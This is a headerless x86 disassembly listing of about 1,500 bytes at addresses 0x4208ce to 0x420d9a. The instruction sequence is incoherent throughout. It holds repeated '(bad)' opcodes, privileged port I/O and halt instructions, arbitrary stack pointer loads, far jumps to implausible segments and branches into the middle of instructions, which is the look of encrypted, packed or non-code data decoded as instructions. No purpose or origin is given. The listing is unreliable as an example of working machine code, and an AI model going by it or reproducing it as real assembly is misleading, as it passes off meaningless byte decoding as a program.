  4208ce:	fild   QWORD PTR [ecx+0x5bbc5510]
  4208d4:	lahf   
  4208d5:	pushaw 
  4208d7:	and    eax,0x26ab64ec
  4208dc:	lods   al,BYTE PTR ds:[esi]
  4208dd:	pop    eax
  4208de:	fistp  QWORD PTR [ecx]
  4208e0:	fwait
  4208e1:	add    edx,DWORD PTR [esi-0x5de95545]
  4208e7:	dec    ecx
  4208e8:	loop   0x4208dd
  4208ea:	test   eax,0xe93fafc5
  4208ef:	or     DWORD PTR [ecx+0x5f3a4764],ebp
  4208f5:	mov    esp,0x77a6bf1d
  4208fa:	call   0x31c681b7
  4208ff:	js     0x4208b4
  420901:	push   edx
  420902:	nop
  420903:	push   edi
  420904:	into   
  420905:	repz mov eax,0x65c611ab
  42090b:	(bad)  
  42090c:	ficomp WORD PTR [ecx]
  42090e:	xor    edx,DWORD PTR [ebp-0x4771ab1d]
  420914:	aaa    
  420915:	push   0x732a78b4
  42091a:	mov    dl,0xd0
  42091c:	mov    bh,0xc8
  42091e:	popa   
  42091f:	shl    BYTE PTR [ecx-0x70c48829],cl
  420925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420926:	xchg   edx,eax
  420927:	repnz adc al,0x56
  42092a:	or     edx,ebx
  42092c:	xor    DWORD PTR [ecx-0x20d22263],ebx
  420932:	js     0x42095c
  420934:	mov    ebp,0x1090e341
  420939:	pop    es
  42093a:	dec    esi
  42093b:	test   dh,al
  42093d:	mov    bl,0xe6
  42093f:	repz fidiv DWORD PTR [ebx+0x69]
  420943:	cmc    
  420944:	xchg   BYTE PTR [esi+0x6905455c],ch
  42094a:	fs aad 0x84
  42094d:	push   0x26
  42094f:	pop    ds
  420950:	inc    ebx
  420951:	cmp    DWORD PTR [ecx],ebx
  420953:	cmc    
  420954:	push   ebx
  420955:	dec    ebp
  420956:	mov    edi,0xd2909830
  42095b:	dec    edx
  42095c:	aas    
  42095d:	dec    BYTE PTR [edi+0x2f6586ad]
  420963:	xor    al,ah
  420965:	mov    ds:0x54df18e,eax
  42096a:	or     ah,BYTE PTR [edx+edx*1+0x77f21095]
  420971:	fist   WORD PTR [ebp-0x32e85a3]
  420977:	cmc    
  420978:	or     bl,0xda
  42097b:	ja     0x4209b6
  42097d:	adc    BYTE PTR [eax-0x836414d],ah
  420983:	int3   
  420984:	dec    edi
  420985:	jp     0x4209da
  420987:	call   0x9ac2:0x12e1478c
  42098e:	jg     0x4209cc
  420990:	hlt    
  420991:	or     eax,0x42873bf4
  420996:	mov    edx,DWORD PTR [eax-0x46]
  420999:	or     cl,BYTE PTR [ebx]
  42099b:	mov    DWORD PTR [edx-0x29],0xdf737fbf
  4209a2:	out    dx,al
  4209a3:	mov    esp,0x360f4de8
  4209a8:	add    ecx,DWORD PTR [eax+0x1d]
  4209ab:	push   0x9bbc51c
  4209b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b1:	pop    edx
  4209b2:	xor    bh,bh
  4209b4:	fmul   st,st(2)
  4209b6:	add    BYTE PTR [ecx-0x4b716253],cl
  4209bc:	loope  0x420988
  4209be:	xchg   esi,eax
  4209bf:	sub    edx,esi
  4209c1:	add    bh,dh
  4209c3:	jge    0x4209a5
  4209c5:	inc    ebp
  4209c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209c7:	sbb    al,0x78
  4209c9:	mov    ds:0x81620dd9,eax
  4209ce:	in     al,0x17
  4209d0:	or     BYTE PTR [edi+edx*2+0x62],cl
  4209d4:	aad    0xbd
  4209d6:	popa   
  4209d7:	mov    esp,0x5e73910
  4209dc:	push   ebx
  4209dd:	push   eax
  4209de:	sar    bl,cl
  4209e0:	scas   eax,DWORD PTR es:[edi]
  4209e1:	rcl    DWORD PTR [edi+eiz*4+0x243cee3b],1
  4209e8:	test   DWORD PTR [edi+0x7d43229e],eax
  4209ee:	dec    ecx
  4209ef:	cli    
  4209f0:	retf   
  4209f1:	pushf  
  4209f2:	pop    ds
  4209f3:	rcl    DWORD PTR [esi],0x8b
  4209f6:	inc    eax
  4209f7:	inc    BYTE PTR [ebp+0x49]
  4209fa:	stc    
  4209fb:	loope  0x4209e2
  4209fd:	pop    edi
  4209fe:	retf   
  4209ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a00:	dec    ecx
  420a01:	mov    ?,WORD PTR [ecx+0x76523f7]
  420a07:	jns    0x420a45
  420a09:	mov    edi,0xbb632ea2
  420a0e:	dec    ecx
  420a0f:	sub    BYTE PTR [ebp+0x4cede5e0],cl
  420a15:	ss imul dl
  420a18:	mov    ebx,0xcb5aab1c
  420a1d:	dec    ebp
  420a1e:	fcmovne st,st(5)
  420a20:	setns  dl
  420a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a24:	and    BYTE PTR [edx],dh
  420a26:	pop    ss
  420a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a28:	xchg   edx,eax
  420a29:	jl     0x420a36
  420a2b:	mov    BYTE PTR [ecx+ebp*1-0x5d782c6c],bl
  420a32:	push   ecx
  420a33:	xor    eax,0x60d8f295
  420a38:	clc    
  420a39:	dec    ebx
  420a3a:	xchg   esi,eax
  420a3b:	xchg   ebp,eax
  420a3c:	call   0xa5d7fcde
  420a41:	cmp    BYTE PTR [ecx+edi*2],dl
  420a44:	leave  
  420a45:	sub    ch,bh
  420a47:	xchg   ebx,eax
  420a48:	out    dx,eax
  420a49:	ds pop ebx
  420a4b:	clc    
  420a4c:	sbb    bl,BYTE PTR [esi-0x21]
  420a4f:	xor    DWORD PTR [eax+0x495d4e1c],ebx
  420a55:	mov    al,0x65
  420a57:	xor    dh,0xb2
  420a5a:	aad    0x7d
  420a5c:	xor    BYTE PTR [bx+si-0x2],ah
  420a60:	dec    edi
  420a61:	mov    DWORD PTR [edx-0x2eaa4876],0x8f375934
  420a6b:	xlat   BYTE PTR ds:[ebx]
  420a6c:	stos   BYTE PTR es:[edi],al
  420a6d:	pop    ecx
  420a6e:	lods   eax,DWORD PTR ds:[esi]
  420a6f:	fsubr  st(6),st
  420a71:	fnsave [eax-0x3f]
  420a74:	adc    cl,dh
  420a76:	dec    ebp
  420a77:	push   ecx
  420a78:	das    
  420a79:	jge    0x420af2
  420a7b:	les    ecx,FWORD PTR [ecx]
  420a7d:	cmp    al,0xd
  420a7f:	(bad)  
  420a80:	push   esi
  420a81:	jecxz  0x420a49
  420a83:	jge    0x420a2d
  420a85:	xchg   DWORD PTR [edi],edx
  420a87:	out    dx,eax
  420a88:	jnp    0x420a9c
  420a8a:	out    dx,eax
  420a8b:	pmaxsw mm5,QWORD PTR [ebx+esi*8-0x54]
  420a90:	mov    eax,0x907d2e03
  420a95:	dec    DWORD PTR [ebx]
  420a97:	or     eax,0x147ad6c7
  420a9c:	(bad)  
  420a9d:	pop    edi
  420a9e:	loopne 0x420a60
  420aa0:	and    dl,BYTE PTR [ecx+0x63b17a22]
  420aa6:	mov    ebp,0xa969c5c5
  420aab:	jo     0x420acc
  420aad:	or     al,dh
  420aaf:	pop    es
  420ab0:	jg     0x420a32
  420ab2:	call   0xb3e4324c
  420ab7:	pop    esp
  420ab8:	and    DWORD PTR [ebx],edx
  420aba:	xchg   DWORD PTR [ecx+edi*2-0x25],edx
  420abe:	dec    esi
  420abf:	out    dx,eax
  420ac0:	mov    esp,0x5a33cf47
  420ac5:	shr    BYTE PTR [ebp-0x6187823],0x84
  420acc:	pushf  
  420acd:	cmp    eax,0x9cad30dc
  420ad2:	jnp    0x420a94
  420ad4:	mov    esp,0xa7f0e5ec
  420ad9:	xlat   BYTE PTR ds:[ebx]
  420ada:	mov    ds:0x6b2c92ae,al
  420adf:	stos   DWORD PTR es:[edi],eax
  420ae0:	jbe    0x420a9a
  420ae2:	mov    ebx,0x117df419
  420ae7:	xor    DWORD PTR [eax+0x57],esp
  420aea:	adc    DWORD PTR [ecx+0x76],ecx
  420aed:	out    dx,al
  420aee:	mov    ebp,0x4f1e03ef
  420af3:	add    edi,DWORD PTR [ebp-0x28]
  420af6:	(bad)  
  420af7:	lea    esi,[esi+edx*2+0x7d7dbda7]
  420afe:	sbb    DWORD PTR [ebp+ecx*1-0x57],ebp
  420b02:	xor    DWORD PTR [edx+0x65aa841],0xfffffffb
  420b09:	inc    esp
  420b0a:	mov    eax,0x2dcb7336
  420b0f:	dec    ecx
  420b10:	xchg   edx,eax
  420b11:	int    0xb6
  420b13:	add    BYTE PTR [ebp-0xe],al
  420b16:	loopne 0x420b2e
  420b18:	pusha  
  420b19:	sar    cl,1
  420b1b:	test   eax,0x82bdd971
  420b20:	ror    esi,0xf2
  420b23:	mov    bh,0xd
  420b25:	fwait
  420b26:	add    BYTE PTR [esp+ebp*1-0x3b1094dc],bh
  420b2d:	imul   ebx,DWORD PTR [ecx],0x53ba7ac6
  420b33:	push   cs
  420b34:	gs or  eax,0xbb8335c4
  420b3a:	test   eax,0xa5ccfd81
  420b3f:	jnp    0x420b46
  420b41:	ret    0xe7de
  420b44:	icebp  
  420b45:	sub    al,0x6f
  420b47:	dec    esi
  420b48:	add    BYTE PTR [ebx],ah
  420b4a:	sbb    edi,DWORD PTR [ecx]
  420b4c:	pop    ebp
  420b4d:	int3   
  420b4e:	in     eax,0xe7
  420b50:	in     al,dx
  420b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b52:	push   cs
  420b53:	push   DWORD PTR [ebx]
  420b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b56:	push   ebp
  420b57:	add    BYTE PTR gs:[ecx-0x56],al
  420b5b:	and    ecx,edx
  420b5d:	dec    ebx
  420b5e:	arpl   WORD PTR [edx+ebp*8],di
  420b61:	cwde   
  420b62:	shl    DWORD PTR ds:0xa70e9d79,cl
  420b68:	mov    WORD PTR [esi-0x67],fs
  420b6b:	adc    DWORD PTR [edi-0x45],edx
  420b6e:	aaa    
  420b6f:	int    0x39
  420b71:	loopne 0x420b9b
  420b73:	xor    dl,BYTE PTR [edi]
  420b75:	jns    0x420bdc
  420b77:	cwde   
  420b78:	mov    dh,0x64
  420b7a:	mov    DWORD PTR [edi],esp
  420b7c:	xchg   ebp,eax
  420b7d:	or     bl,BYTE PTR [eax+ebp*1+0x39]
  420b81:	fist   DWORD PTR [esi]
  420b83:	jmp    0x396ce459
  420b88:	jmp    0x9181:0xecbb11cc
  420b8f:	data16 sbb al,BYTE PTR [ebp+edx*1+0x52577a19]
  420b97:	jp     0x420b76
  420b99:	xchg   esp,eax
  420b9a:	fst    DWORD PTR [esi-0x40]
  420b9d:	cs xor al,0x55
  420ba0:	fcomp  QWORD PTR [edx+0x65]
  420ba3:	lds    esi,FWORD PTR [edi+0x73]
  420ba6:	adc    al,0x45
  420ba8:	fisubr DWORD PTR gs:[ebp+edi*8-0x65]
  420bad:	pushf  
  420bae:	lds    ebx,FWORD PTR [ebp+0x28]
  420bb1:	mov    eax,ds:0x76d10edd
  420bb6:	es and eax,0x29c0908c
  420bbc:	int    0x6d
  420bbe:	sub    DWORD PTR [edi+0x30],ebx
  420bc1:	xor    ebp,DWORD PTR [ecx+0x581f94b8]
  420bc7:	scas   eax,DWORD PTR es:[edi]
  420bc8:	and    BYTE PTR [edx-0x7],cl
  420bcb:	adc    DWORD PTR [eax-0x5644828],ebx
  420bd1:	repz (bad) 
  420bd4:	sbb    DWORD PTR ds:0xed6d611a,ebp
  420bda:	aaa    
  420bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bdc:	xor    edx,DWORD PTR [edx-0x1]
  420bdf:	into   
  420be0:	jne    0x420bc1
  420be2:	lahf   
  420be3:	inc    eax
  420be4:	sbb    eax,DWORD PTR [eax]
  420be6:	hlt    
  420be7:	and    ebx,DWORD PTR [esp+ebx*2+0x7d64fbdc]
  420bee:	push   edx
  420bef:	xchg   edx,eax
  420bf0:	loopne 0x420c63
  420bf2:	loop   0x420c66
  420bf4:	es sub eax,0x7fb6b2c4
  420bfa:	jbe    0x420bd0
  420bfc:	mov    DWORD PTR [ebx+0x1d1e8f79],ebx
  420c02:	addr16 inc eax
  420c04:	addr16 xor esp,esp
  420c07:	ds fsubp st(3),st
  420c0a:	aas    
  420c0b:	(bad)  
  420c0c:	jg     0x420b97
  420c0e:	sbb    al,0x6e
  420c10:	loopne 0x420c4c
  420c12:	sahf   
  420c13:	in     eax,0x33
  420c15:	inc    edi
  420c16:	jmp    0x420c5a
  420c18:	mov    cl,0x30
  420c1a:	push   edx
  420c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c1c:	mov    eax,ds:0xc46fd3a9
  420c21:	push   eax
  420c22:	lock and eax,0xdf064f3f
  420c28:	push   edx
  420c29:	retf   0xfd01
  420c2c:	sbb    dh,BYTE PTR [edx-0x75]
  420c2f:	loopne 0x420c70
  420c31:	mov    bh,0x84
  420c33:	sbb    eax,0xa7564410
  420c38:	push   0xffffff9e
  420c3a:	stc    
  420c3b:	mov    eax,0x36ab5434
  420c40:	retf   0xa1e4
  420c43:	add    BYTE PTR [ebx],ch
  420c45:	ins    BYTE PTR es:[edi],dx
  420c46:	in     al,dx
  420c47:	aam    0x43
  420c49:	iret   
  420c4a:	inc    ebp
  420c4b:	in     eax,0x1d
  420c4d:	inc    edx
  420c4e:	or     eax,DWORD PTR [edi-0x97a41eb]
  420c54:	test   eax,0xae866a30
  420c59:	sar    BYTE PTR [ebx],cl
  420c5b:	and    eax,0xbd84a741
  420c60:	fld    QWORD PTR [ebp+0x7940441c]
  420c66:	jge    0x420cd6
  420c68:	mov    esi,0x20b6676a
  420c6d:	ins    DWORD PTR es:[edi],dx
  420c6e:	xchg   DWORD PTR [edx+0x20],eax
  420c71:	jmp    0x741e:0x3560d0b0
  420c78:	lods   al,BYTE PTR ds:[esi]
  420c79:	sub    cl,0x10
  420c7c:	cmc    
  420c7d:	lods   eax,DWORD PTR ds:[esi]
  420c7e:	fcom   DWORD PTR [ecx]
  420c80:	jno    0x420c35
  420c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c83:	popa   
  420c84:	jb     0x420c5a
  420c86:	mov    ebp,0xb059d627
  420c8b:	mov    edx,0xa9bb6343
  420c90:	aam    0xcf
  420c92:	mov    dh,BYTE PTR [esi+edx*4]
  420c95:	(bad)  
  420c96:	mov    esi,0xc748713d
  420c9b:	push   ebp
  420c9c:	cmp    ecx,DWORD PTR [edi+eiz*1]
  420c9f:	test   eax,0x2ba5eacf
  420ca4:	outs   dx,DWORD PTR ds:[esi]
  420ca5:	test   esi,ebx
  420ca7:	and    eax,DWORD PTR [ebx+0x95bf2b]
  420cad:	lods   al,BYTE PTR ds:[esi]
  420cae:	dec    ecx
  420caf:	jno    0x420cc4
  420cb1:	repnz retf 
  420cb3:	xor    al,0x8
  420cb5:	lods   al,BYTE PTR ds:[esi]
  420cb6:	sub    al,0xdb
  420cb8:	ret    0x64fa
  420cbb:	scas   al,BYTE PTR es:[edi]
  420cbc:	cli    
  420cbd:	xor    DWORD PTR [esi-0x7a],edi
  420cc0:	cmp    edi,edi
  420cc2:	dec    edi
  420cc3:	test   eax,0x137cffde
  420cc8:	dec    ebx
  420cc9:	push   0xea82ba38
  420cce:	dec    esi
  420ccf:	fwait
  420cd0:	out    0x15,al
  420cd2:	mov    DWORD PTR [eax+0x24],eax
  420cd5:	and    DWORD PTR [edx+eax*1+0x7c6f7eb6],esi
  420cdc:	in     al,0x81
  420cde:	jp     0x420c99
  420ce0:	test   BYTE PTR [ebx],0xe
  420ce3:	pop    esp
  420ce4:	iret   
  420ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ce6:	mov    cl,0x9a
  420ce8:	icebp  
  420ce9:	popf   
  420cea:	arpl   WORD PTR [edx],si
  420cec:	lds    esp,FWORD PTR [ecx]
  420cee:	push   ebx
  420cef:	pusha  
  420cf0:	sub    BYTE PTR [edi],bh
  420cf2:	in     eax,0x84
  420cf4:	gs enter 0x32df,0x5f
  420cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cfa:	jg     0x420c96
  420cfc:	fisttp DWORD PTR [esi]
  420cfe:	jb     0x420d02
  420d00:	mov    cl,0x83
  420d02:	mov    dh,0x6a
  420d04:	clc    
  420d05:	inc    ebx
  420d06:	inc    esi
  420d07:	xor    DWORD PTR [bp+si+0x576f],eax
  420d0c:	ins    DWORD PTR es:[edi],dx
  420d0d:	in     eax,0x9c
  420d0f:	lahf   
  420d10:	fisub  WORD PTR ss:[eax]
  420d13:	mov    ch,0x46
  420d15:	mov    dh,0x88
  420d17:	mov    ah,BYTE PTR [eax]
  420d19:	scas   eax,DWORD PTR es:[edi]
  420d1a:	dec    ecx
  420d1b:	sti    
  420d1c:	mov    al,ds:0xae6810bb
  420d21:	push   0x294e8d7e
  420d26:	jle    0x420cfa
  420d28:	out    0x74,al
  420d2a:	mov    al,0xc
  420d2c:	xchg   ebx,eax
  420d2d:	adc    ecx,edi
  420d2f:	out    dx,eax
  420d30:	iret   
  420d31:	popf   
  420d32:	js     0x420d4e
  420d34:	out    0x56,al
  420d36:	inc    edx
  420d37:	or     al,0x61
  420d39:	adc    al,0xcf
  420d3b:	retf   
  420d3c:	das    
  420d3d:	sbb    eax,0xef980d10
  420d42:	jne    0x420d2c
  420d44:	xchg   ecx,eax
  420d45:	fwait
  420d46:	push   ebx
  420d47:	leave  
  420d48:	pop    esp
  420d49:	or     BYTE PTR [ecx-0x6671929f],ch
  420d4f:	fbstp  TBYTE PTR [ecx]
  420d51:	sar    DWORD PTR [esp+eiz*8-0x77f61a1d],cl
  420d58:	jns    0x420da3
  420d5a:	adc    dh,BYTE PTR [edx]
  420d5c:	or     dl,BYTE PTR [ebx+0x7eb8bc08]
  420d62:	inc    ebx
  420d63:	shl    al,cl
  420d65:	std    
  420d66:	int3   
  420d67:	retf   0xc1b1
  420d6a:	cmp    al,0x53
  420d6c:	les    ecx,FWORD PTR [edx+0x690a3030]
  420d72:	dec    edx
  420d73:	es fcmovnbe st,st(4)
  420d76:	ret    
  420d77:	sbb    bl,ah
  420d79:	stos   DWORD PTR es:[edi],eax
  420d7a:	call   FWORD PTR [edx]
  420d7c:	xchg   esp,eax
  420d7d:	out    dx,eax
  420d7e:	or     DWORD PTR [ecx],edi
  420d80:	and    bh,ah
  420d82:	xchg   edi,eax
  420d83:	dec    ebx
  420d84:	xchg   DWORD PTR [esi-0x7f4d2bf1],edi
  420d8a:	sub    ch,BYTE PTR [esi]
  420d8c:	js     0x420d61
  420d8e:	mov    WORD PTR [eax+0x19a233ff],ds
  420d94:	dec    edx
  420d95:	add    bh,ah
  420d97:	das    
  420d98:	out    0xd2,eax
  420d9a:	les    esp,FWORD PTR [ecx+0x0]
	...
